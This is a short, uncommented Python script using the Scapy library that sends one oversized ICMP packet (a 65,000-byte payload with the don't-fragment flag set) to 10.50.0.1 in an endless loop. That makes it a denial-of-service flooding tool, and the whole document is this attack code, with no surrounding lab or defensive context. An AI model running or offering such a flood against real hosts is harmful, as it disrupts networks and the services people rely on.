from scapy.all import *



p=IP(dst='10.50.0.1', flags=2, frag=0)/ICMP()/("x"*65000)
send(p, verbose=0, loop=1)

